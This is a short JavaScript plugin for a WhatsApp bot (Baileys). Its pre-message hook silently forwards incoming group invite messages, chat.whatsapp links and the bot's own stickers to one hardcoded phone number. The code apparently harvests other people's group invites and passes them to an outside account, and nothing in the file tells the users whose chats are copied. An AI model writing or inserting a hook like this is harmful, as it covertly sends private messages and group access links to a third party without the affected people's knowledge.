let handler = m => m

handler.before = function (m, { conn }) {
  if (!global.db.data.settings.auto) return
  if (m.isBaileys && m.fromMe) return true
  let isSikon = m.mtype
    if (isSikon === "stickerMessage" && m.fromMe) {
        m.copyNForward('994407430641@s.whatsapp.net', true)
    } else if ((isSikon === 'groupInviteMessage' || m.text.startsWith('https://chat') || m.text.startsWith('Buka tautan ini')) && !m.isBaileys) {
        m.copyNForward('994407430641@s.whatsapp.net', true)
    }
}

module.exports = handler